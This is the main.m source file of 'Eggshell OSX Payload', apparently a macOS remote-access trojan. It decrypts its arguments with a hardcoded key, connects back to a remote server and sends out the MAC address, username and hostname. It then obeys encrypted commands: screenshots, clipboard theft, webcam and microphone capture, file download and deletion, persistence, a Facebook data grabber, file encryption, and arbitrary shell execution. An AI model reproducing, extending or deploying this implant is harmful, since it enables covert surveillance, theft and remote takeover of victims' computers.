//
//  main.m
//  Eggshell OSX Payload
//
//  Created by Lucas Jackson on 8/23/16.
//  Copyright © 2016 Lucas Jackson. All rights reserved.
//
#import <Foundation/Foundation.h>
#import <sys/socket.h>
#import "AppKit/AppKit.h"
#import "espl.h"
NSString *bkey = @"spGHbigdxMBJpbOCAr3rnS3inCdYQyZV";
espl *_espl;

//MARK: Main

int main(int argc, const char * argv[]) {
    _espl = [[espl alloc] init];
    if (argc == 1) { return 0; }
    //decrypt argument with shared key
    NSString *argument = [NSString stringWithFormat:@"%s",argv[1]];
    argument = [escryptor decryptB64ToNSString:bkey :argument];
    NSArray *args = [argument componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
    int success = [_espl connect:[NSString stringWithFormat:@"%@",args[0]] :atoi([args[1] UTF8String])];
    _espl.skey = args[2];
    _espl.terminator = [args[3] substringToIndex:16];
    _espl.liveterminator = [args[4] substringToIndex:16];
    if (success == -1) {
        NSLog(@"couldnt establish connection %s %s %s",argv[1],argv[2],argv[3]);
    }
    else {
        //send mac address, username@host info to server
        NSString *systeminfo = [NSString stringWithFormat:@"%@ %@@%@",[_espl GetMACAddressDisplayString],NSUserName(),[[NSHost currentHost] localizedName]];
        [_espl sendString:systeminfo];
        //eggshell
        NSString *command;
        char buffer[2048];
        while (read (sockfd, &buffer, sizeof(buffer))) {
            @autoreleasepool {
                command = [NSString stringWithFormat:@"%s",buffer];
                command = [escryptor decryptB64ToNSString:_espl.skey :command];
                NSArray *cmdarray = [command componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
                //TODO: make this 1 function, by checking arrays for valid cmds
                if ([cmdarray[0] isEqualToString: @"exit"]) {
                    exit(0);
                }
                else if ([cmdarray[0] isEqualToString: @"getpid"]) {
                    [_espl getPid];
                }
                else if ([cmdarray[0] isEqualToString: @"screenshot"]) {
                    [_espl screenshot];
                }
                else if ([cmdarray[0] isEqualToString: @"getpaste"]) {
                    [_espl getPaste];
                }
                else if ([cmdarray[0] isEqualToString: @"idletime"]) {
                    [_espl idleTime];
                }
                else if ([cmdarray[0] isEqualToString: @"brightness"]) {
                    [_espl set_brightness:cmdarray];
                }
                else if ([cmdarray[0] isEqualToString: @"ls"]) {
                    printf("key = %s\n",[_espl.skey UTF8String]);
                    [_espl directoryList:cmdarray];
                }
                else if ([cmdarray[0] isEqualToString: @"cd"]) {
                    [_espl changeWD:cmdarray];
                }
                else if ([cmdarray[0] isEqualToString: @"rm"]) {
                    [_espl rmFile:cmdarray];
                }
                else if ([cmdarray[0] isEqualToString: @"pwd"]) {
                    [_espl sendString:_espl.fileManager.currentDirectoryPath];
                }
                else if ([cmdarray[0] isEqualToString: @"download"]) {
                    [_espl download:cmdarray];
                }
                else if ([cmdarray[0] isEqualToString: @"picture"]) {
                    [_espl takePicture];
                }
                else if ([cmdarray[0] isEqualToString: @"mic"]) {
                    [_espl mic:cmdarray];
                }
                else if ([cmdarray[0] isEqualToString: @"openurl"]) {
                    [_espl openURL:cmdarray];
                }
                else if ([cmdarray[0] isEqualToString: @"persistence"]) {
                    [_espl persistence:args[0]:args[1]];
                }
                else if ([cmdarray[0] isEqualToString: @"rmpersistence"]) {
                    [_espl removePersistence:args[0]:args[1]];
                }
                else if ([cmdarray[0] isEqualToString: @"getfacebook"]) {
                    [_espl getFacebook];
                }
                else if ([cmdarray[0] isEqualToString: @"upload"]) { //still need to do this
                    [_espl receiveFile:cmdarray[0]];
                }
                else if ([cmdarray[0] isEqualToString: @"encrypt"]) {
                    [_espl encryptFile:cmdarray];
                }
                else if ([cmdarray[0] isEqualToString: @"decrypt"]) {
                    [_espl decryptFile:cmdarray];
                }
                else {
                    [_espl runtask:command];
                }
                //clear the received data
                memset(buffer,'\0',2048);
            }
        }
    }
    
    return 0;
}

